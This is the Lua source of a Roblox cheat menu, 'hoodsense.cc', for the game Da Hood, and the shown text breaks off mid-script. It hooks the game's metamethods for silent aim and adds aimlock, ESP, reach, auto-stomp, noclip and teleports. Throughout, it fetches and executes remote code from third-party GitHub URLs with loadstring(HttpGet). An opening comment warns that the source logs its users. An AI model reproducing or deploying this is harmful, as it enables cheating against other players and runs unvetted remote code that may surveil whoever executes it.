--[[
old src
this shit is loggin look - line 1984

]]
local Config = {
    WindowName = "hoodsense.cc",
	Color = Color3.fromRGB(22, 88, 232),
	Keybind = Enum.KeyCode.V
}

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/Roblox/main/BracketV3.lua"))()
local Window = Library:CreateWindow(Config, game:GetService("CoreGui"))

local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fov.lua"))()
local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/esp.lua"))()
ESP:Toggle(false)
ESP.Tracers = false
ESP.Names = false
ESP.Boxes = false
Aiming.TeamCheck(false)
Aiming.VisibleCheck = false
 
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
 
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local CurrentCamera = Workspace.CurrentCamera

local DaHoodSettings = {
    SilentAim = false,
    AimLock = false,
    Prediction = 0.178
}

game.StarterGui:SetCore("SendNotification", {
    Title = "hoodsense.cc";
    Text = "Hello, Loading...";
    Icon = "http://www.roblox.com/asset/?id=8768441000";
    Duration = "10";
    callbakc = bindableFunction;
    Button1 = "Okay!";
})
wait(3)
local Tab1 = Window:CreateTab("Main")
local Tab2 = Window:CreateTab("Teleports")
local Tab3 = Window:CreateTab("Avatar")
local Tab4 = Window:CreateTab("Misc")
local Tab6 = Window:CreateTab("Credits")
local Tab7 = Window:CreateTab("Settings")

local Section1 = Tab1:CreateSection("Aim Configuration")
local Section2 = Tab1:CreateSection("Fov Configuration")
local Section99 = Tab1:CreateSection("Esp Configuration")
local Section12 = Tab1:CreateSection("Toggles")
local Section5 = Tab2:CreateSection("Guns")
local Section11 = Tab2:CreateSection("Places")
local Section6 = Tab3:CreateSection("Avatar Modifiactions")
local other2 = Tab3:CreateSection("Other")
local Section7 = Tab3:CreateSection("Face Changer")
local Section8 = Tab4:CreateSection("Miscelanious")
local Section9 = Tab4:CreateSection("Fun Stuff")
local section54 = Tab4:CreateSection("Auto Farm")
local Section13 = Tab6:CreateSection("Credits")
local Section10 = Tab6:CreateSection("Partners")
local Section3 = Tab7:CreateSection("Menu")
local Section4 = Tab7:CreateSection("Background")

local PartnersLabel = Section10:CreateLabel("Supporting with creating project!")
PartnersLabel:UpdateText("Supporting with creating project!")

----------------------------------------------------------------
-------------------------//  AIMING  -------------------------
local SilentAimToggle = Section1:CreateToggle("Silent Aim", nil, function(bool)
    DaHoodSettings.SilentAim = bool
end)
SilentAimToggle:AddToolTip("Enables Silentaim.")
SilentAimToggle:CreateKeybind("", function()
end)

local PredictLagToggle = Section1:CreateToggle("Predict Lag", nil, function(bool)
    DaHoodSettings.Prediction.Lag = bool
end)
PredictLagToggle:AddToolTip("Enables Predict Lag.")

local FovCircleToggle = Section1:CreateToggle("FOV Circle", nil, function(bool)
    Aiming.ShowFOV = bool
end)
FovCircleToggle:AddToolTip("Enables FOV Circle.")

local VisibleCheckToggle = Section1:CreateToggle("Visible Check", nil, function(bool)
    Aiming.VisibleCheck = bool
end)
VisibleCheckToggle:AddToolTip("Checks if target is visible.")

local HitAirShootsToggle = Section1:CreateToggle("Hit Airshots", nil, function(bool)
    Aiming.Airshots = true
end)
HitAirShootsToggle:AddToolTip("Hits Airshots.")

local HitChanceSlider = Section2:CreateSlider("Silent Aim Hitchance", 0,400,nil,false, function(value)
    DaHoodSettings.Prediction = tonumer("0." .. value)
end)
HitChanceSlider:AddToolTip("Customize hitchance.")

local aimlocklabel = Section1:CreateLabel("Aimlock")

-------------------------------
-----// AIMING FUNCTION -----
function Aiming.Check()
    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
        return false
    end
 
    local Character = Aiming.Character(Aiming.Selected)
    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
 
    if (KOd or Grabbed) then
        return false
    end
 
    return true
end
local __index
__index = hookmetamethod(game, "__index", function(t, k)
    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
        local SelectedPart = Aiming.SelectedPart
        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
 
            return (k == "Hit" and Hit or SelectedPart)
        end
    end
 
    return __index(t, k)
end)
 
local LMFAO = false
 
UserInputService.InputBegan:Connect(function(Key, Is)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
        LMFAO = true
    end
end)
 
UserInputService.InputEnded:Connect(function(Key, Is)
    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
        LMFAO = false
    end
end)
-----------------------------------------------------------

local aimlock = Section1:CreateButton("Enable Aimlock", function()
    getgenv().AimPart = "HumanoidRootPart"
    getgenv().AimlockKey = "q"
    getgenv().AimRadius = 30
    getgenv().ThirdPerson = true
    getgenv().FirstPerson = true
    getgenv().TeamCheck = false
    getgenv().PredictMovement = true
    getgenv().PredictionVelocity = 9
    local L_27_, L_28_, L_29_, L_30_ =
        game:GetService "Players",
    game:GetService "UserInputService",
    game:GetService "RunService",
    game:GetService "StarterGui"
    local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
        L_27_.LocalPlayer,
    L_27_.LocalPlayer:GetMouse(),
    workspace.CurrentCamera,
    CFrame.new,
    Ray.new,
    Vector3.new,
    Vector2.new
    local L_38_, L_39_, L_40_ = true, false, false
    local L_41_
    getgenv().CiazwareUniversalAimbotLoaded = true
    getgenv().WorldToViewportPoint = function(L_42_arg0)
        return L_33_:WorldToViewportPoint(L_42_arg0)
    end
    getgenv().WorldToScreenPoint = function(L_43_arg0)
        return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
    end
    getgenv().GetObscuringObjects = function(L_44_arg0)
        if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
            local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
            if L_45_ then
                return L_45_:IsDescendantOf(L_44_arg0)
            end
        end
    end
    getgenv().GetNearestTarget = function()
        local L_46_ = {}
        local L_47_ = {}
        local L_48_ = {}
        for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
            if L_51_forvar1 ~= L_31_ then
                table.insert(L_46_, L_51_forvar1)
            end
        end
        for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
            if L_53_forvar1.Character ~= nil then
                local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
                if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
                    local L_55_ =
                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local L_56_ =
                        Ray.new(
                            game.Workspace.CurrentCamera.CFrame.p,
                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
                        )
                    local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
                    local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
                    table.insert(L_48_, L_59_)
                elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
                    local L_60_ =
                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
                    local L_61_ =
                        Ray.new(
                            game.Workspace.CurrentCamera.CFrame.p,
                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
                        )
                    local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
                    local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
                    table.insert(L_48_, L_64_)
                end
            end
        end
        if unpack(L_48_) == nil then
            return nil
        end
        local L_49_ = math.floor(math.min(unpack(L_48_)))
        if L_49_ > getgenv().AimRadius then
            return nil
        end
        for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
            if L_66_forvar1.diff == L_49_ then
                return L_66_forvar1.plr
            end
        end
        return nil
    end
    L_32_.KeyDown:Connect(
        function(L_67_arg0)
            if L_67_arg0 == AimlockKey and L_41_ == nil then
                pcall(
                    function()
                        if L_39_ ~= true then
                            L_39_ = true
                        end
                        local L_68_
                        L_68_ = GetNearestTarget()
                        if L_68_ ~= nil then
                            L_41_ = L_68_
                        end
                    end
                )
            elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
                if L_41_ ~= nil then
                    L_41_ = nil
                end
                if L_39_ ~= false then
                    L_39_ = false
                end
            end
        end
    )
    L_29_.RenderStepped:Connect(
        function()
            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
                if
                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
                then
                    L_40_ = true
                else
                    L_40_ = false
                end
            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
                    L_40_ = true
                else
                    L_40_ = false
                end
            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
                    L_40_ = true
                else
                    L_40_ = false
                end
            end
            if L_38_ == true and L_39_ == true then
                if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
                    if getgenv().FirstPerson == true then
                        if L_40_ == true then
                            if getgenv().PredictMovement == true then
                                L_33_.CFrame =
                                    L_34_(
                                        L_33_.CFrame.p,
                                        L_41_.Character[getgenv().AimPart].Position +
                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
                                    )
                            elseif getgenv().PredictMovement == false then
                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
                            end
                        end
                    elseif getgenv().ThirdPerson == true then
                        if L_40_ == true then
                            if getgenv().PredictMovement == true then
                                L_33_.CFrame =
                                    L_34_(
                                        L_33_.CFrame.p,
                                        L_41_.Character[getgenv().AimPart].Position +
                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
                                    )
                            elseif getgenv().PredictMovement == false then
                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
                            end
                        end
                    end
                end
            end
        end
    )
end)
aimlock:AddToolTip("Enables Aimlock [Q]")

local aimlockprediction = Section1:CreateTextBox("Aimlock Prediction", "Prediction", true, 	function(L_70_arg0)
    PredictionVelocity = L_70_arg0
end)
aimlockprediction:SetValue("9")
aimlockprediction:AddToolTip("Changes Prediction.")

local aimlockaimpart = Section1:CreateDropdown("Aimpart", {"Head","UpperTorso","HumanoidRootPart","LowerTorso"}, function(L_71_arg0)
    getgenv().AimPart = L_71_arg0
end)
aimlockaimpart:SetOption("UpperTorso")
aimlockaimpart:AddToolTip("Changes Aimpart.")
--------------------------------------------------------------------
-------------------------//  FOV CIRCLE  -------------------------

local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,true, function(value)
    Aiming.FOV = value
end)
FovCircleSize:AddToolTip("Customize Fov Circle Size.")

local fovsides = Section2:CreateSlider("Fov Circle Sides", 0,40,nil,true, function(value)
    Aiming.FOVSides  = value
end)
FovCircleSize:AddToolTip("Customize Fov Circle Sides.")

local fovcolor = Section2:CreateColorpicker("Fov Color", function(color)
	Aiming.FOVColour = color
end)
fovcolor:AddToolTip("Change FOV color.")
fovcolor:UpdateColor(Color3.fromRGB(20, 124, 255))

--------------------------------------------------------------
-----------------------//  TOGGLES   -----------------------

local AntiSlow = Section12:CreateToggle("Anti-Slow", nil, function(gh)
    if gh == true then
        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
        end)
    elseif gh == false then
        game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
    end
end)
local Reach = Section12:CreateToggle("Reach", nil, function(e)
    if e == true then
        game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
            local success, err = pcall(function()
                if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                    for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                    firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                else
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                end
                            end
                        end
                    end
                end
            end)
        end)
    elseif e == false then
        game:GetService('RunService'):UnbindFromRenderStep("Reach")
    end
end)
--AntiSlow:CreateKeybind("", function()
local AutoStomp = Section12:CreateToggle("Auto-Stomp", nil, function(r)
    if r == true then
        game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
            game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
        end)
    elseif r == false then
        game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
    end
end)
--AutoStomp:CreateKeybind("", function()
local AntiStomp = Section12:CreateToggle("Anti-Stomp", nil, function(x)
    if x == true then
        game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
            if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA('MeshPart') or v:IsA('Part') then
                        v:Destroy()
                    end
                end
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA('Accessory') then
                        v.Handle:Destroy()
                    end
                end
            end
        end)
    elseif x == false then
        game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
    end
end)
--AntiStomp:CreateKeybind("", function()
local AutoReload = Section12:CreateToggle("Auto-Reload", nil, function(r)
    if r == true then
        game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
            if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
                        wait(1)
                    end
                end
            end
        end)
    elseif r == false then
        game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
    end
end)
--AutoReload:CreateKeybind("", function()

local Noclip = Section12:CreateButton("No Clip", function()
local noclipplayer = game:GetService("Players").LocalPlayer
local noclipmouse = noclipplayer:GetMouse()
 
local donoclip = false
local noclip = false
 
function b_noclip(key)
if (key == "b") then
if noclip == false then
donoclip = true
 
noclip = true
elseif noclip == true then
donoclip = false
 
noclip = false
end
end
end
 
noclipmouse.KeyDown:connect(b_noclip)
 
game:GetService("Players").LocalPlayer.Character.Head.Touched:connect(function(obj)
if obj ~= workspace.Terrain then
if donoclip == true then
obj.CanCollide = false
else
obj.CanCollide = true
end
end
end)
end)
Noclip:AddToolTip("Enables Noclip [B].")


local fly2 = Section12:CreateButton("Fly", function()
    loadstring(Game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua'))()
end)
fly2:AddToolTip("Enables fly [X]")

local fovchanger = Section12:CreateSlider("Change Fov", 0,120,nil,true, function(value)
    game:GetService'Workspace'.Camera.FieldOfView = value
end)

getgenv().SpinBotSpeed = 20

local spinbot = Section12:CreateToggle("Spin Bot", nil, function(state)
	function getRoot(char)
				local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('UpperTorso')
				return rootPart
			end

			if state == true then
				local Spin = Instance.new("BodyAngularVelocity")
				Spin.Name = "Spinning"
				Spin.Parent = getRoot(game.Players.LocalPlayer.Character)
				Spin.MaxTorque = Vector3.new(0, math.huge, 0)
				Spin.AngularVelocity = Vector3.new(0,getgenv().SpinBotSpeed,0)
			else
				for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
					if v.Name == "Spinning" then
						v:Destroy()
					end
				end
			end
		end)
spinbot:CreateKeybind("", function()
end)
spinbot:AddToolTip("Enables spinbot.")

local spinbotspeed = Section12:CreateSlider("Spinbot Speed",20,50,nil,true, function(a)
    getgenv().SpinBotSpeed = a
end)
spinbotspeed:SetValue(20)
spinbotspeed:AddToolTip("Reset spinbot after changing.")
--[[-------------------------------------------------------------------
-------------------------//  OTHER MODS   ------------------------

local reset = Section98:CreateButton("Reset Character", function(reset)
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)
reset:AddToolTip("Resets your character")
]]
--------------------------------------------------------------------
-----------------------------//  ESP   ---------------------------
local espToggle = Section99:CreateToggle("Enable ESP", nil, function(bool)
    ESP:Toggle(bool)
end)
espToggle:AddToolTip("Enables ESP.")
espToggle:CreateKeybind("", function()
end)

local tracersToggle = Section99:CreateToggle("Enable Tracers", nil, function(bool)
    ESP.Tracers = bool
end)
tracersToggle:AddToolTip("Enables Tracers.")

local namesToggle = Section99:CreateToggle("Enable Names", nil, function(bool)
    ESP.Names = bool
end)
namesToggle:AddToolTip("Enables Names.")

local boxesToggle = Section99:CreateToggle("Enable Boxes", nil, function(bool)
    ESP.Boxes = bool
end)
tracersToggle:AddToolTip("Enables Boxes.")

local espcolor = Section99:CreateColorpicker("Esp Color", function(color)
	ESP.Color = color
end)
espcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
espcolor:AddToolTip("Change ESP Color.")

---------------------------------------------------------------------
-------------------------//  AVATAR MODS   ------------------------

local animationgamepass = Section6:CreateButton("Animation Gamepass", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/animation_gamepass.lua'))()
end)
animationgamepass:AddToolTip("Loads Animation Gamepass.")

local animbutton = Section6:CreateButton("Animations", function(bool)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/anims.lua"))()
end)
animbutton:AddToolTip("Changes your animations.")

local headlbutton = Section6:CreateButton("Headless", function(bool)
game.Players.LocalPlayer.Character.Head.Transparency = 1
for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
if (v:IsA("Decal")) then
v:Destroy()
end
end
end)
headlbutton:AddToolTip("Makes you headless. [NOT FE]")

local korbloxbutton = Section6:CreateButton("Korblox", function(bool)
    local ply = game.Players.LocalPlayer
    local chr = ply.Character
    chr.RightLowerLeg.MeshId = "rbxassetid://902942093"
    chr.RightLowerLeg.Transparency = "1"
    chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
    chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
    chr.RightFoot.MeshId = "rbxassetid://902942089"
    chr.RightFoot.Transparency = "1"
end)
korbloxbutton:AddToolTip("Gets you korblox [NOT FE]")

local animatedbeastmode = Section6:CreateButton("Animated Beast Mode", function()
	while true do
local player = game.Players.LocalPlayer.Character
if player:findFirstChild("Humanoid") then
    player.Head.face.Texture = "https://www.roblox.com/asset/?id=209712379"
    end
wait(1)
if player:findFirstChild("Humanoid") then
    player.Head.face.Texture = "https://www.roblox.com/asset/?id=127959433"
    end
wait(1)
end
end)
animatedbeastmode:AddToolTip("Makes your face animated.")

---------------------------------------------------------------------
--------------------------//  FACE MODS   -------------------------

local meanie = Section7:CreateButton("Meanie", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/508490451.lua'))()
end)
meanie:AddToolTip("Changes your face to Meanie.")

local sshf = Section7:CreateButton("Super Super Happy Face", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/494290547.lua'))()
end)
sshf:AddToolTip("Changes your face to Super Super Happy Face.")

local silverpunk = Section7:CreateButton("Silver Punk Face", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/387256104.lua'))()
end)
silverpunk:AddToolTip("Changes your face to Silver Punk Face.")

local yum = Section7:CreateButton("Yum", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/26018945.lua'))()
end)
yum:AddToolTip("Changes your face to Yum.")

local playful = Section7:CreateButton("Playful Vampire", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/2409281591.lua'))()
end)
playful:AddToolTip("Changes your face to Playful Vampire.")

local beastmode = Section7:CreateButton("Beast Mode", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/127959433.lua'))()
end)
beastmode:AddToolTip("Changes your face to Beast Mode.")

--------------------------------------------------------------------
--------------------------//  TELEPORTS  -------------------------
--------------------------    GUNS     //-------------------------
--------------------------------------------------------------------
local revolver = Section5:CreateButton("Revolver", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
end)

local ak = Section5:CreateButton("Ak", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
end)

local smg = Section5:CreateButton("Smg", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
end)

local ar = Section5:CreateButton("AR", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.824158, 5.46046877, -744.731628, 0, 0, 1, 0, 1, -0, -1, 0, 0)
end)

local dbs = Section5:CreateButton("Double Barrel", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
end)

local shotgun = Section5:CreateButton("Shotgun", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
end)

local flame = Section5:CreateButton("Flame Thrower", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.122437, 50.9120102, -104.93145, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local tac = Section5:CreateButton("Tactical Shotgun", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local rpg = Section5:CreateButton("Rpg", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0, 0, 0, 1, 0, 0, 0, -1)
end)

local drumgun = Section5:CreateButton("Drum Gun", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.548996, 19.7020588, -82.1449585, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local armor = Section5:CreateButton("High Medium Armor", function(bool)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-939, -25, 571)
end)

local bat = Section5:CreateButton("Bat", function(bool)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
end)

local mediumarmor = Section5:CreateButton("Medium Armor", function(bool)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(528, 50, -637)
end)
--------------------------------------------------------------------
--------------------------//  TELEPORTS  -------------------------
--------------------------   PLACES    //-------------------------
--------------------------------------------------------------------
local church = Section11:CreateButton("Church", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0, 1, -0, -1, 0, 0)
end)

local admin1 = Section11:CreateButton("Admin Guns", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.853516, -34.4276848, -538.013306, -0.999724388, -3.9898886e-08, -0.0234765243, -3.9204977e-08, 1, -3.00177518e-08, 0.0234765243, -2.90890814e-08, -0.999724388)
end)

local admin2 = Section11:CreateButton("Admin Guns 2", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-808.708557, -39.6492004, -932.789368, 0.999899805, 2.01343173e-08, -0.0141554065, -2.17800533e-08, 1, -1.16108232e-07, 0.0141554065, 1.16404912e-07, 0.999899805)
end)

local admin3 = Section11:CreateButton("Admin Food", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.053406, -39.6492004, -932.951233, 0.998369277, 2.46515359e-08, 0.0570784509, -2.8773524e-08, 1, 7.13949646e-08, -0.0570784509, -7.29209759e-08, 0.998369277)
end)

local ufo = Section11:CreateButton("Ufo", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.85052466, 132, -736.571106, -0.0460956171, -4.24733706e-08, -0.998937011, 7.26012459e-08, 1, -4.58687275e-08, 0.998937011, -7.46384217e-08, -0.0460956171)
end)

local casino = Section11:CreateButton("Casino", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local bank = Section11:CreateButton("Bank", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)
end)

local taco = Section11:CreateButton("Taco", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.026855, 48.1605072, -474.033936, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local revRoof = Section11:CreateButton("Revolver Roof", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-634.463135, 80.434761, -204.232559, -0.0190527271, -1.03574322e-07, -0.999818563, 4.36709335e-09, 1, -1.03676342e-07, 0.999818563, -6.3416179e-09, -0.0190527271)
end)

local playground = Section11:CreateButton("PlayGround", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-282.694153, 19.7496624, -807.719727, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

local gas = Section11:CreateButton("Gas Station", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(604.800415, 46.0998344, -258.249573, 0, 0, 1, 0, 1, -0, -1, 0, 0)
end)

local cementery = Section11:CreateButton("Cementery", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.109558, 99.75, -57.2315979, 0.999993503, -0.000633752206, -0.0035054055, 0.000638642872, 0.999998808, 0.00139435288, 0.00350463158, -0.00139658386, 0.999992728)
end)

local school = Section11:CreateButton("School Roof", function(bool)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
end)

--------------------------------------------------------------------
--------------------------//   EXTRA  ----------------------------
--------------------------   STUFF  //----------------------------
--------------------------------------------------------------------
local rejoin = Section8:CreateButton("Rejoin", function()
